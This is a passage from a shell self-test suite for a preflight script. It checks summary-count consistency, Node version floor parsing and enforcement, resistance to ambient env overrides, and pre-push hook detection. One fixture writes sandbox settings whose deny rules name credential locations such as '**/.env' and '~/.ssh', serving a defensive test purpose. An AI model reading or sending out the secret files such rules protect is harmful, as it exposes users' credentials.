    _sm_sr=$(printf '%s\n' "$_sm_out" | sed -n 's/^\([0-9][0-9]*\) advisory warning(s) above.*/\1/p')
    _sm_sb=$(printf '%s\n' "$_sm_out" | sed -n 's/^[0-9].* advisory warning(s) above.*[^0-9]\([0-9][0-9]*\) boundary notice(s).*/\1/p')
    _sm_sg=$(printf '%s\n' "$_sm_out" | sed -n 's/^[0-9].* advisory warning(s) above.*[^0-9]\([0-9][0-9]*\) git-plant warning(s).*/\1/p')
    if [ "$_sm_nr" -lt 2 ] || [ "$_sm_nb" -lt 1 ] || [ "$_sm_ng" -lt 1 ]; then _sm_res="the fixture did not print every kind (advisory $_sm_nr, boundary $_sm_nb, git-plants $_sm_ng): vacuous"
    elif [ "$_sm_sr" != "$_sm_nr" ]; then _sm_res="the summary says '$_sm_sr' advisory warning(s) but $_sm_nr such lines printed"
    elif [ "$_sm_sb" != "$_sm_nb" ]; then _sm_res="the summary says '$_sm_sb' boundary notice(s) but $_sm_nb such lines printed"
    elif [ "$_sm_sg" != "$_sm_ng" ]; then _sm_res="the summary says '$_sm_sg' git-plant warning(s) but $_sm_ng such lines printed"
    else _sm_res=ok; fi
  }
  if ! { _sm_g -C "$_sm_w" init -q . && _sm_g -C "$_sm_w" remote add origin https://github.com/example/summary-fixture.git && _sm_g -C "$_sm_w" config core.hooksPath .husky; } >/dev/null 2>&1; then
    echo "FAIL: swas-793 [summary-matches-lines] the fixture repository could not be built (its assertions are void)"; fail=1
  else
    _sm_run "$_pr_self"; _sm_check
    case "$_sm_out" in *"Universal prerequisites:"*) : ;; *) _sm_res="the real body never ran (vacuous): $_sm_out" ;; esac
    if [ "$_sm_res" = ok ]; then echo "PASS: swas-793 [summary-matches-lines] the real body's summary says $_sm_sr advisory, $_sm_sb boundary and $_sm_sg git-plant, each the count of its own lines in the same output"
    else echo "FAIL: swas-793 [summary-matches-lines] $_sm_res: $_sm_out"; fail=1; fi
    # mutant summary-drops-boundary: the boundary clause is gated off in a copy; the same run's summary then lacks the boundary number, so the match goes red.
    if _pr_mut summary-drops-boundary '/# MUT-SUMBND$/s/\[ "\$bwarn" -gt 0 \]/[ "$bwarn" -gt 99999 ]/'; then
      _sm_run "$_pr_mp"; _sm_check
      case "$_sm_res" in
        ok) echo "FAIL: mutant summary-drops-boundary survived (the summary still matches the lines)"; fail=1 ;;
        *vacuous*) echo "FAIL: mutant summary-drops-boundary never ran the fixture (vacuous): $_sm_res"; fail=1 ;;
        *) echo "PASS: mutant summary-drops-boundary is killed ($_sm_res)" ;;
      esac
    fi
  fi
  rm -rf "$_sm_d"

  # — T5 (CP-7 K3/K5): the DECLARED Node floor is ENFORCED, not merely declared ————————————
  # Field defect (cold run 4): preflight checked only that `node` EXISTS, so an operator on Node 20.10
  # got a green "All prerequisites present."; `npm ci` then proceeded on an EBADENGINE *warning* and the
  # failure surfaced deep inside Rolldown as `node:util.styleText` — unreadable as a version problem.
  # Policy (owner-ratified): HARD-FAIL WITH A NAMED ESCAPE. These cases lock every leg of it.

  # the parser: real `node --version` and .nvmrc shapes -> MAJOR
  out=$(node_major "v24.18.0" 2>&1) || out="<node_major absent/errored>"
  case "$out" in "24") echo "PASS: parses 'v24.18.0' -> 24";; *) echo "FAIL: v24.18.0 parsed as '$out'"; fail=1;; esac
  out=$(node_major "v20.20.2" 2>&1) || out="<absent>"
  case "$out" in "20") echo "PASS: parses 'v20.20.2' -> 20";; *) echo "FAIL: v20.20.2 parsed as '$out'"; fail=1;; esac
  out=$(node_major "24" 2>&1) || out="<absent>"
  case "$out" in "24") echo "PASS: parses a bare '24' (the .nvmrc shape) -> 24";; *) echo "FAIL: bare '24' parsed as '$out'"; fail=1;; esac
  out=$(node_major "v9.11.2" 2>&1) || out="<absent>"
  case "$out" in "9") echo "PASS: parses 'v9.11.2' -> 9 (the lexical-trap case)";; *) echo "FAIL: v9.11.2 parsed as '$out'"; fail=1;; esac
  if node_major "lts/iron" >/dev/null 2>&1; then echo "FAIL: a moving alias ('lts/iron') was accepted as a version"; fail=1; else echo "PASS: 'lts/iron' is unparseable (rc 1) — no invented floor"; fi
  if node_major "" >/dev/null 2>&1; then echo "FAIL: empty version accepted"; fail=1; else echo "PASS: empty version rejected (rc 1)"; fi

  # NO GLOB (same landmine as git_version_parts): the version line is word-SPLIT, never pathname-expanded.
  # A '*' would otherwise expand against the cwd, so a file named '99.9.9' would BE the running version —
  # a floor reading the filesystem instead of the runtime, and one that silences a real refusal.
  _ng=$(mktemp -d)
  : > "$_ng/99.9.9"
  out=$( cd "$_ng" && node_major "* v20.20.2" 2>&1 ) || out="<absent>"
  case "$out" in
    "20") echo "PASS: a '*' in the version line does NOT glob against the cwd (20, not the filename)" ;;
    *) echo "FAIL: the node version line was GLOB-expanded — parsed '$out' from the filesystem"; fail=1 ;;
  esac
  rm -rf "$_ng"

  # the floor reader: profiles/<stack>/scaffold/.nvmrc is the SINGLE source (no sixth declaration)
  _rt=$(mktemp -d)
  printf '24\n' > "$_rt/plain"
  out=$(read_runtime_floor "$_rt/plain" 2>&1) || out="<read_runtime_floor absent/errored>"
  case "$out" in "24") echo "PASS: reads a plain '24' .nvmrc -> floor 24";; *) echo "FAIL: plain .nvmrc read as '$out'"; fail=1;; esac
  printf 'v24.4.0\n' > "$_rt/vform"
  out=$(read_runtime_floor "$_rt/vform" 2>&1) || out="<absent>"
  case "$out" in "24") echo "PASS: reads a 'v24.4.0' .nvmrc -> floor 24";; *) echo "FAIL: v-form .nvmrc read as '$out'"; fail=1;; esac
  printf '# pinned by the profile\n\n24\n' > "$_rt/commented"
  out=$(read_runtime_floor "$_rt/commented" 2>&1) || out="<absent>"
  case "$out" in "24") echo "PASS: skips comments/blank lines in .nvmrc -> floor 24";; *) echo "FAIL: commented .nvmrc read as '$out'"; fail=1;; esac
  printf 'lts/iron\n' > "$_rt/alias"
  if read_runtime_floor "$_rt/alias" >/dev/null 2>&1; then echo "FAIL: an 'lts/iron' .nvmrc yielded a floor"; fail=1; else echo "PASS: an unparseable .nvmrc is rc 1 (caller must WARN, not invent a floor)"; fi
  if read_runtime_floor "$_rt/nope" >/dev/null 2>&1; then echo "FAIL: a missing .nvmrc yielded a floor"; fail=1; else echo "PASS: a missing .nvmrc is rc 1"; fi
  if read_runtime_floor "$_rt" >/dev/null 2>&1; then echo "FAIL: a directory yielded a floor"; fail=1; else echo "PASS: an unreadable (directory) .nvmrc is rc 1"; fi

  # AT/ABOVE the floor -> ok, and NEITHER refusal nor waiver is armed
  RUNTIME_REFUSE=0; RUNTIME_WAIVED=0; ALLOW_RUNTIME_MISMATCH=0; miss=0; rec=0
  PREFLIGHT_NODE_VERSION_CMD='echo v24.18.0'
  check_runtime_floor typescript-node "$_rt/plain" > "$_rt/out" 2>&1 || true
  unset PREFLIGHT_NODE_VERSION_CMD
  out=$(cat "$_rt/out")
  case "$out" in *ok*"meets the Node 24 floor"*) echo "PASS: an in-floor runtime reports ok and states the version";; *) echo "FAIL: in-floor runtime not reported ok ($out)"; fail=1;; esac
  if [ "$RUNTIME_REFUSE" -eq 0 ] && [ "$RUNTIME_WAIVED" -eq 0 ] && [ "$miss" -eq 0 ] && [ "$rec" -eq 0 ]; then
    echo "PASS: an in-floor runtime arms nothing (no refusal, no waiver, no warn)"
  else echo "FAIL: in-floor runtime armed something (refuse=$RUNTIME_REFUSE waive=$RUNTIME_WAIVED miss=$miss rec=$rec)"; fail=1; fi

  # BELOW the floor, no escape -> REFUSE (this is the whole point: the green is gone)
  RUNTIME_REFUSE=0; RUNTIME_WAIVED=0; ALLOW_RUNTIME_MISMATCH=0; miss=0; rec=0
  PREFLIGHT_NODE_VERSION_CMD='echo v20.20.2'
  check_runtime_floor typescript-node "$_rt/plain" > "$_rt/out" 2>&1 || true
  unset PREFLIGHT_NODE_VERSION_CMD
  out=$(cat "$_rt/out")
  if [ "$RUNTIME_REFUSE" -eq 1 ] && [ "$RUNTIME_WAIVED" -eq 0 ]; then echo "PASS: a below-floor runtime REFUSES by default"; else echo "FAIL: below-floor runtime did not refuse (refuse=$RUNTIME_REFUSE waive=$RUNTIME_WAIVED)"; fail=1; fi
  case "$out" in *v20.20.2*24*) echo "PASS: the below-floor line names BOTH the running version and the floor";; *) echo "FAIL: below-floor line does not name both versions ($out)"; fail=1;; esac

  # THE NUMERIC-COMPARE PROOF: lexically "9" > "24", so a string-naive floor would wave Node 9 through.
  RUNTIME_REFUSE=0; RUNTIME_WAIVED=0; ALLOW_RUNTIME_MISMATCH=0; miss=0; rec=0
  PREFLIGHT_NODE_VERSION_CMD='echo v9.11.2'
  check_runtime_floor typescript-node "$_rt/plain" > "$_rt/out" 2>&1 || true
  unset PREFLIGHT_NODE_VERSION_CMD
  if [ "$RUNTIME_REFUSE" -eq 1 ]; then echo "PASS: node 9 refused against a 24 floor (numeric compare: 9 < 24)"; else echo "FAIL: node 9 accepted — STRING-NAIVE compare ('9' > '24' lexically)"; fail=1; fi

  # THE NAMED ESCAPE: --allow-runtime-mismatch proceeds, loudly, and NEVER silently
  RUNTIME_REFUSE=0; RUNTIME_WAIVED=0; ALLOW_RUNTIME_MISMATCH=1; miss=0; rec=0
  PREFLIGHT_NODE_VERSION_CMD='echo v20.20.2'
  check_runtime_floor typescript-node "$_rt/plain" > "$_rt/out" 2>&1 || true
  unset PREFLIGHT_NODE_VERSION_CMD
  ALLOW_RUNTIME_MISMATCH=0
  out=$(cat "$_rt/out")
  if [ "$RUNTIME_WAIVED" -eq 1 ] && [ "$RUNTIME_REFUSE" -eq 0 ]; then echo "PASS: --allow-runtime-mismatch waives the refusal and records the waiver"; else echo "FAIL: escape did not waive (refuse=$RUNTIME_REFUSE waive=$RUNTIME_WAIVED)"; fail=1; fi
  case "$out" in *WARN*) echo "PASS: the waived run WARNs loudly";; *) echo "FAIL: waived run did not WARN ($out)"; fail=1;; esac
  case "$out" in *UNSUPPORTED*) echo "PASS: the waived run says UNSUPPORTED in as many words";; *) echo "FAIL: waived run does not say UNSUPPORTED ($out)"; fail=1;; esac
  if [ "$miss" -eq 0 ]; then echo "PASS: the waiver does not set miss (it proceeds — that is the escape)"; else echo "FAIL: waiver set miss"; fail=1; fi

  # .nvmrc ABSENT on a Node stack -> WARN WITH THE REASON. Fail-safe toward disclosure: never a silent
  # skip, and never a version-verified green we did not earn.
  RUNTIME_REFUSE=0; RUNTIME_WAIVED=0; ALLOW_RUNTIME_MISMATCH=0; miss=0; rec=0
  PREFLIGHT_NODE_VERSION_CMD='echo v24.18.0'
  check_runtime_floor typescript-node "$_rt/nope" > "$_rt/out" 2>&1 || true
  unset PREFLIGHT_NODE_VERSION_CMD
  out=$(cat "$_rt/out")
  case "$out" in *warn*UNVERIFIED*) echo "PASS: a missing .nvmrc WARNs that the floor is UNVERIFIED";; *) echo "FAIL: missing .nvmrc did not warn UNVERIFIED ($out)"; fail=1;; esac
  case "$out" in *"$_rt/nope"*) echo "PASS: the UNVERIFIED warning names the path it could not read (the reason)";; *) echo "FAIL: warning does not name the unreadable path ($out)"; fail=1;; esac
  if [ "$miss" -eq 0 ] && [ "$RUNTIME_REFUSE" -eq 0 ]; then echo "PASS: an unreadable floor warns without hard-failing (disclosure, not refusal)"; else echo "FAIL: unreadable floor set miss/refuse (miss=$miss refuse=$RUNTIME_REFUSE)"; fail=1; fi
  if [ "$rec" -eq 1 ]; then echo "PASS: the UNVERIFIED warning is counted as an advisory (rec)"; else echo "FAIL: UNVERIFIED warning not counted ($rec)"; fail=1; fi

  # node absent / unreadable version -> WARN, never a crash and never a silent pass
  RUNTIME_REFUSE=0; RUNTIME_WAIVED=0; ALLOW_RUNTIME_MISMATCH=0; miss=0; rec=0
  PREFLIGHT_NODE_VERSION_CMD='false'
  check_runtime_floor typescript-node "$_rt/plain" > "$_rt/out" 2>&1 || true
  unset PREFLIGHT_NODE_VERSION_CMD
  out=$(cat "$_rt/out")
  case "$out" in *warn*UNVERIFIED*) echo "PASS: an unrunnable 'node --version' degrades to an UNVERIFIED warn";; *) echo "FAIL: unrunnable node not warned ($out)"; fail=1;; esac
  if [ "$RUNTIME_REFUSE" -eq 0 ]; then echo "PASS: an unrunnable node does not fabricate a refusal"; else echo "FAIL: unrunnable node refused"; fail=1; fi

  # PER-STACK, NOT GLOBAL: a stack that does not run on node is completely unaffected — no line at all.
  RUNTIME_REFUSE=0; RUNTIME_WAIVED=0; ALLOW_RUNTIME_MISMATCH=0; miss=0; rec=0
  PREFLIGHT_NODE_VERSION_CMD='echo v20.20.2'
  check_runtime_floor go "$_rt/plain" > "$_rt/out" 2>&1 || true
  check_runtime_floor __nope__ "$_rt/plain" >> "$_rt/out" 2>&1 || true
  unset PREFLIGHT_NODE_VERSION_CMD
  out=$(cat "$_rt/out")
  if [ -z "$out" ] && [ "$RUNTIME_REFUSE" -eq 0 ] && [ "$rec" -eq 0 ]; then
    echo "PASS: a non-Node stack (and an unknown stack) is untouched by the Node floor"
  else echo "FAIL: non-Node stack affected (out='$out' refuse=$RUNTIME_REFUSE rec=$rec)"; fail=1; fi
  RUNTIME_REFUSE=0; RUNTIME_WAIVED=0; miss=0; rec=0
  rm -rf "$_rt"

  # WIRED end-to-end. The direct calls above prove the FUNCTION; they cannot see the `exit 1` wiring in
  # the main path, and a defined-but-unacted-on check is decorative (the exact class that shipped twice
  # in this repo). Drive all three legs through the REAL body via --selftest-e2e.
  rf_bad_rc=0
  rf_bad=$(cd "$_pr_xp" && PREFLIGHT_NODE_VERSION_CMD='echo v20.20.2' PREFLIGHT_GH_CMD='false' ACTIONLINT_VALID_CMD='__skip__' \
    sh "$_pr_self" --selftest-e2e --boundary-advisory --stack typescript-node 2>&1) || rf_bad_rc=$?   # SWAS-784: from the export-shaped fixture, not the kit cwd
  case "$rf_bad" in *v20.20.2*) echo "PASS: a real below-floor run names the RUNNING version";; *) echo "FAIL: real run did not name the running version (rc=$rf_bad_rc): $rf_bad"; fail=1;; esac
  case "$rf_bad" in *"Node 24"*|*"node >= 24"*|*">= 24"*) echo "PASS: a real below-floor run names the REQUIRED floor";; *) echo "FAIL: real run did not name the floor: $rf_bad"; fail=1;; esac
  case "$rf_bad" in *--allow-runtime-mismatch*) echo "PASS: the refusal NAMES the escape in the same message (signpost, don't relax)";; *) echo "FAIL: refusal does not name --allow-runtime-mismatch: $rf_bad"; fail=1;; esac
  if [ "$rf_bad_rc" -ne 0 ]; then echo "PASS: a real below-floor run EXITS NON-ZERO (the wiring, not just the function)"; else echo "FAIL: below-floor run exited 0 — the check is decorative"; fail=1; fi
  case "$rf_bad" in *"All prerequisites present"*) echo "FAIL: a refused run still printed the green"; fail=1;; *) echo "PASS: a refused run prints NO 'All prerequisites present' green";; esac

  rf_ok_rc=0
  rf_ok=$(cd "$_pr_xp" && PREFLIGHT_NODE_VERSION_CMD='echo v24.18.0' PREFLIGHT_GH_CMD='false' ACTIONLINT_VALID_CMD='__skip__' \
    sh "$_pr_self" --selftest-e2e --boundary-advisory --stack typescript-node 2>&1) || rf_ok_rc=$?   # SWAS-784: from the export-shaped fixture, not the kit cwd
  case "$rf_ok" in *"meets the Node 24 floor"*) echo "PASS: a real in-floor run states the version it verified";; *) echo "FAIL: in-floor run did not state the verified floor (rc=$rf_ok_rc): $rf_ok"; fail=1;; esac

  rf_esc_rc=0
  rf_esc=$(cd "$_pr_xp" && PREFLIGHT_NODE_VERSION_CMD='echo v20.20.2' PREFLIGHT_GH_CMD='false' ACTIONLINT_VALID_CMD='__skip__' \
    sh "$_pr_self" --selftest-e2e --boundary-advisory --stack typescript-node --allow-runtime-mismatch 2>&1) || rf_esc_rc=$?   # SWAS-784: from the export-shaped fixture, not the kit cwd
  case "$rf_esc" in *UNSUPPORTED*) echo "PASS: a real waived run says UNSUPPORTED";; *) echo "FAIL: waived run does not say UNSUPPORTED (rc=$rf_esc_rc): $rf_esc"; fail=1;; esac
  # A SUPPRESSED REFUSAL MUST NEVER READ AS A PASS. DIFFERENTIAL, not absolute: assert the green is
  # absent under the escape *given that the same environment prints it in-floor* — an absolute assert
  # would false-RED on a machine that fails preflight for an unrelated ambient reason.
  if printf '%s' "$rf_ok" | grep -q 'All prerequisites present'; then
    case "$rf_esc" in
      *"All prerequisites present"*) echo "FAIL: the escape printed the clean green — a suppressed refusal read as a pass"; fail=1 ;;
      *) echo "PASS: the same environment prints the green in-floor but NOT under the escape (differential)" ;;
    esac
  elif [ -n "$_st_ci" ]; then
    echo "FAIL: this environment prints no green even in-floor, so the green/no-green differential is not observable and CI is set (a weak result is a failure)"; fail=1
  else
    echo "PASS: (weak) this environment prints no green even in-floor — the green/no-green differential is not observable here"
  fi

  # SWAS-355 floor-rc-is-the-floor (design r1.1, L1): the below-floor cell asserts a NON-ZERO exit, and on a developer terminal without the user-scope
  # strictAllowlist `bfail` alone makes the rc non-zero, so that cell would pass vacuously. Every e2e call therefore passes --boundary-advisory, and this
  # cell proves the non-zero rc comes from the floor. DIFFERENTIAL (the rule of the git-floor cell above): the boundary is pinned (an OFF sandbox that nothing
  # declares, so bfail FIRES), and the below-floor rc is asserted non-zero only when the floor-met run exits 0 in the same environment; else the weak PASS.
  _fl_fx=$(mktemp -d)
  printf '{"sandbox":{"enabled":false}}\n' > "$_fl_fx/off.json"
  printf '{"sandbox":{"enabled":true,"filesystem":{"denyRead":["**/.env","~/.ssh"],"denyWrite":["./.claude","~/.claude/settings.json"]}}}\n' > "$_fl_fx/on.json"
  _flr() {  # <node version> <boundary flag or ""> <project settings>: the typescript-node e2e run with the boundary pinned; sets flr_rc
    flr_rc=0
    # shellcheck disable=SC2086  # $2 is one optional flag
    env -u CI -u GITHUB_ACTIONS -u SANDBOX_RUNTIME PREFLIGHT_NODE_VERSION_CMD="echo $1" PREFLIGHT_BOUNDARY_OPTOUT=@absent PREFLIGHT_SANDBOX_SETTINGS="$3" PREFLIGHT_SANDBOX_LOCAL=/nonexistent-local PREFLIGHT_SANDBOX_USER=/nonexistent-user PREFLIGHT_SANDBOX_MANAGED=/nonexistent-managed PREFLIGHT_SANDBOX_OS=Darwin PREFLIGHT_SANDBOX_TOOLS=sandbox-exec PREFLIGHT_SANDBOX_BWRAP_OK=1 PREFLIGHT_GH_CMD=false ACTIONLINT_VALID_CMD=__skip__ sh "$0" --selftest-e2e $2 --stack typescript-node >/dev/null 2>&1 || flr_rc=$?
  }
  _flr_cell() {  # <flag for the run on which bfail fires> -> _flr_res = ok | red | weak (weak: this environment exits non-zero even with the floor met and a clean boundary)
    _flr v24.0.0 --boundary-advisory "$_fl_fx/on.json"; _flr_ok=$flr_rc
    _flr v24.0.0 "$1" "$_fl_fx/off.json"; _flr_adv=$flr_rc
    if [ "$_flr_ok" -ne 0 ]; then _flr_res=weak
    elif [ "$_flr_adv" -ne 0 ]; then _flr_res=red
    else _flr_res=ok; fi
  }
  _flr_cell --boundary-advisory
  case "$_flr_res" in
    ok) echo "PASS: floor-rc-is-the-floor [advisory] the floor met exits 0 under --boundary-advisory even with an undeclared OFF sandbox (bfail does not reach the rc)" ;;
    weak) if [ -n "$_st_ci" ]; then echo "FAIL: floor-rc-is-the-floor [advisory] not observable here and CI is set (a weak result is a failure)"; fail=1; else echo "PASS: (weak) floor-rc-is-the-floor [advisory] this environment exits non-zero with the floor met and a clean boundary, so the differential is not observable here"; fi ;;
    *) echo "FAIL: floor-rc-is-the-floor [advisory] --boundary-advisory let bfail move the exit"; fail=1 ;;
  esac
  _flr v24.0.0 "" "$_fl_fx/off.json"; _flr_un=$flr_rc
  _flr v24.0.0 --boundary-advisory "$_fl_fx/on.json"; _flr_ok=$flr_rc
  _flr v20.20.2 --boundary-advisory "$_fl_fx/on.json"; _flr_bad=$flr_rc
  if [ "$_flr_ok" -ne 0 ] && [ -n "$_st_ci" ]; then
    echo "FAIL: floor-rc-is-the-floor [differential] the floor-met run exits $_flr_ok and CI is set (a weak result is a failure)"; fail=1
  elif [ "$_flr_ok" -ne 0 ]; then
    echo "PASS: (weak) floor-rc-is-the-floor [differential] the floor-met run exits $_flr_ok in this environment, so a non-zero below-floor rc proves nothing here"
  else
    if [ "$_flr_bad" -ne 0 ]; then echo "PASS: floor-rc-is-the-floor [below-floor] the below-floor run exits non-zero where the floor-met run exits 0 (the rc is the floor)"; else echo "FAIL: floor-rc-is-the-floor [below-floor] the below-floor run exited 0"; fail=1; fi
    if [ "$_flr_un" -ne 0 ]; then echo "PASS: floor-rc-is-the-floor [bfail-fires] without the flag the pinned undeclared OFF sandbox exits non-zero (the pin is not vacuous)"; else echo "FAIL: floor-rc-is-the-floor [bfail-fires] the pinned undeclared OFF sandbox did not move the exit without the flag"; fail=1; fi
  fi
  # mutant e2e-drops-advisory: one harness call WITHOUT the flag, on the run where bfail fires, must turn the cell red.
  _flr_cell ""
  case "$_flr_res" in
    red) echo "PASS: mutant e2e-drops-advisory is killed (a harness call without --boundary-advisory turns floor-rc-is-the-floor red)" ;;
    weak) if [ -n "$_st_ci" ]; then echo "FAIL: mutant e2e-drops-advisory is not observable here and CI is set (a weak result is a failure)"; fail=1; else echo "PASS: (weak) mutant e2e-drops-advisory is not observable here (this environment exits non-zero with a clean boundary)"; fi ;;
    *) echo "FAIL: mutant e2e-drops-advisory survived (the cell stayed green with the flag dropped)"; fail=1 ;;
  esac
  rm -rf "$_fl_fx"

  # PER-STACK end-to-end: a non-Node stack run below the Node floor is unaffected by it.
  rf_go=$(PREFLIGHT_NODE_VERSION_CMD='echo v20.20.2' PREFLIGHT_GH_CMD='false' ACTIONLINT_VALID_CMD='__skip__' \
    sh "$0" --selftest-e2e --boundary-advisory --stack go 2>&1) || true
  case "$rf_go" in *"Node"*"floor"*) echo "FAIL: a go run was judged against the Node floor: $rf_go"; fail=1;; *) echo "PASS: a non-Node stack run is unaffected end-to-end";; esac

  # NO AMBIENT SPOOF (flag-not-env) — load-bearing HERE in a way it is not for the advisory git floor:
  # this check BLOCKS, so an ambient export that could tell it "you are on Node 24" would turn a refusal
  # into a pass. MARKER, NOT VERSION-STRING (the git-floor lesson): assert the seam command never RAN,
  # rather than keying on output the host's real node is entitled to produce.
  _nd=$(mktemp -d); _nmarker="$_nd/ran"
  printf '#!/bin/sh\ntouch "%s"\necho v24.18.0\n' "$_nmarker" > "$_nd/fakenode"
  chmod +x "$_nd/fakenode"
  _ign_o=$(env CI=1 PREFLIGHT_NODE_VERSION_CMD="$_nd/fakenode" PREFLIGHT_GH_CMD='false' ACTIONLINT_VALID_CMD='__skip__' \
    sh "$0" --stack typescript-node 2>&1 </dev/null) || true   # R7: CI=1 and no TTY (S25), so no origin read
  # SWAS-784 liveness: on the kit cwd (class kit) the body still runs; the marker's absence proves nothing unless it ran past the class line.
  case "$_ign_o" in *"Universal prerequisites:"*) : ;; *) echo "FAIL: the ambient node-version cell never ran the real body (vacuous): $_ign_o"; fail=1 ;; esac
  if [ -e "$_nmarker" ]; then
    echo "FAIL: an AMBIENT PREFLIGHT_NODE_VERSION_CMD was honored in a real run (env, not flag) — a blocking check the environment can redirect"; fail=1
  else
    echo "PASS: a real run IGNORES an ambient PREFLIGHT_NODE_VERSION_CMD (the seam needs an explicit flag)"
  fi
  rm -rf "$_nd"

  # — K11 (CP7R5): the pre-push runtime guard must be IN FORCE, not merely provided ————————————
  # git clones neither .git/hooks/ nor .git/config, so an incepted repo's guard is ABSENT in every fresh
  # clone. That is by design (hooks/pre-push:4 — "A SPEED BUMP, not a boundary"); the defect is that the
  # absence is SILENT, and in the CP-7 run-4 cold field test that silence let a real push land on
  # protected main. These legs prove the DETECTION ONLY — that check_guard_installed classifies four hook
  # states correctly on real fixture trees. They prove NOTHING about whether the check is REACHED in a
  # real run (a leg placed after an early exit would still pass every one of them); that is a separate,
  # main-path proof.
  #
  # SECOND CEILING — nothing MUTATES these automatically. conformance/non-vacuity.sh does not reach them:
  # its target set is the `^check control` rows of conformance/verify.sh (non-vacuity.sh:282), and
  # scripts/preflight.sh is not one of them (a wiring lock for it was, until SWAS-626 removed it). So every assertion below must carry its OWN kill decision; "the sweep would have
  # caught it" is not available here.
  #
  # But the legs themselves have TWO teeth, measured, not assumed (2026-07-21; a third, a verify.sh row, was removed by SWAS-626):
  #   1. `sh scripts/preflight.sh --selftest`, wired as a CI step in .github/workflows/ci.yml;
  #   2. hand mutation-testing (this comment's own discipline).
  # HISTORICAL, CORRECTED (T2 fix-loop, finding J6): this paragraph used to say "while guard_tree_class's
  # body is `:`, this selftest exits 1, so verify.sh's `adopter-preflight` row is RED BY CONSTRUCTION
  # until the owner writes that predicate" — the deliberate red state of the T1 slice. The owner wrote
  # that predicate; the body is no longer `:` and the row is green. The sentence stayed true only
  # VACUOUSLY, as a conditional whose premise had ended, which is the same class of stale comment this
  # very file keeps paying for. The durable half is the reason it was written: a comment that understates
  # which gates a leg binds is "a comment standing in for execution", so the teeth are stated, not the
  # obsolete red state. (A third tooth, stated when this was written, was the verify.sh row; SWAS-626 removed it, and the two teeth above remain.)
  #
  # Each leg runs the check in a SUBSHELL with cwd = the fixture, because `git rev-parse --git-path` reads
  # the cwd. cd-ing in THIS shell instead would leave the relative `sh "$0"` re-invocations above
  # unresolvable if a leg ever aborted mid-way. A subshell cannot propagate GUARD_REFUSE/GUARD_STATE back
  # to the parent, so it prints them as a trailer — the armed flag IS this function's refusal signal (it
  # returns 0 on every path; the exit-1 wiring is the refusal block in the main body — grep
  # `if [ "$GUARD_REFUSE" -eq 1 ]` — reached from the bare `check_guard_installed` call site just above
  # `if is_github_repo`. BOTH CITED BY ANCHOR, NOT BY NUMBER: the numbers this comment used to carry
  # (:1642 and :1580) were already stale by the end of the T2 fix-loop, which added legs above them —
  # a line number standing in for the thing it names is the same failure as a comment standing in for
  # execution), so the flag is what must be asserted here, alongside a
  # discriminating message. Asserting a bare exit code would be the --raw scar restated: preflight
  # exits 1 for a missing tool and 2 for bad usage, so a bare code check passes for the wrong
  # reason.
  # WHEN THIS COMMENT WAS WRITTEN (T1) THAT WIRING DID NOT EXIST: there was no call site and no consumer
  # of GUARD_REFUSE anywhere, so "lives in the main body" named a line that had never been written, and
  # every leg below was green against a function the real run never called. T2 built it and locked it —
  # legs MP1..MP5 drive the WHOLE SCRIPT precisely because nothing in this k11_run block can see a
  # missing call site. The sentence is kept, corrected, and cited rather than deleted: this file has now
  # paid for "a comment standing in for execution" more than once, and the scar is the useful part.
  # K11_ROOT is resolved from $0, NOT from the cwd: `sh /abs/path/scripts/preflight.sh --selftest` run
  # from anywhere else made `pwd -P` the WRONG root, so `cp` failed and `set -e` killed the whole selftest
  # with a bare `cp:` error — before it ever printed its OK/FAIL verdict line. A selftest that can be
  # silenced by the caller's cwd is not a gate. R0 turns the unbuildable case into a real FAIL line.
  K11_ROOT=$( CDPATH='' cd -- "$(dirname -- "$0")/.." && pwd -P ) || K11_ROOT=""
  if [ -z "$K11_ROOT" ] || [ ! -f "$K11_ROOT/hooks/pre-push" ]; then
    echo "FAIL: K11/R0 cannot resolve the fixture source hooks/pre-push from \$0 (K11_ROOT='$K11_ROOT') — every K11 leg below is unbuildable"; fail=1
  else
  # Everything from here to the matching `fi` (just before the verdict line) is the K11 leg body. It is
  # deliberately left at the outer indent: sh has no `continue` outside a loop, so the R0 precondition
  # has to be an if/else, and re-indenting ~140 lines to express "R0 passed" would obscure the legs
  # themselves. The `fi` at the end of A1 closes this.
  echo "PASS: K11/R0 the fixture source hooks/pre-push resolves from \$0, independent of the cwd ($K11_ROOT)"
  # HERMETIC BY CONSTRUCTION. Every git invocation below — fixture build AND the check under test — is
  # prefixed GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null. Without that the developer's own
  # ~/.gitconfig leaks into the fixtures and the gate reds for reasons unrelated to the code. Measured
  # (2026-07-21), same predicate, 30 legs: clean global config 30 PASS / 0 FAIL; a global
  # core.hooksPath + commit.gpgsign=true 16 PASS / 12 FAIL — the hooksPath sends EVERY fixture down the
  # disclosed skip (P1, N1x2, N2x2, F1, X1, U1x2, W3x2) and the gpgsign makes the worktree fixture's
  # commit fail so W1/W2 cannot be built at all. With the prefixes, both runs are 30/0 and leg-for-leg
  # identical. That developer is the husky/lefthook persona leg H1 exists to SERVE — a gate that reds on
  # their laptop for an unrelated reason is a gate they stop reading, and tooth 3 above means it reds
  # their whole `verify.sh`, not one CI step.
  # Belt-and-braces `-c commit.gpgsign=false` on the fixture commit as well: these env vars need git
  # >= 2.32. Unlike an unsupported FLAG (which errors), an unsupported env var is silently ignored and
  # degrades to today's behaviour — that asymmetry is also why the M1 fix below uses cd+pwd rather than
  # `--path-format=absolute`. The redundant `-c` is what covers a pre-2.32 git for the gpgsign half.
  k11_fx() {  # <incepted|kit-source> <state> [root-name-suffix] -> dir
    # states: installed|inert|foreign|foreign-inert|unreadable|none|none-forged-src|none-foreign-src
    #         |none-no-src|none-fifo-src|dangling|hooks-dir-symlink|hooks-dir-root|hookspath
    #         |hookspath-noop|hookspath-noop-nodir|hookspath-escape|hookspath-global|hookspath-nl
    # THE THIRD ARGUMENT is what lets the final fix-loop's legs exist at all: the X2/X3 attacks are
    # carried by the REPOSITORY ROOT'S OWN NAME, which `mktemp -d` chooses. The suffix is appended to
    # the mktemp directory (renamed BEFORE `git init`, so nothing in .git records the old name), which
    # keeps the fixture a single removable directory — no parent left behind, no TMPDIR leak.
    # The fixture models the TREE CLASS it names, not merely the hook state. .kit-manifest (written by
    # adopter-export) and ENGINEERING-PRINCIPLES.md (incept.sh:540's rename of the principles CLAUDE.md)
    # are what the export/inception lineage leaves behind; ADR-000-stack.md and hooks/pre-push ride along
    # in BOTH classes, so neither discriminates alone. That is the measured signal set guard_tree_class
    # is written against — a thinner fixture would false-RED a correct predicate.
    #
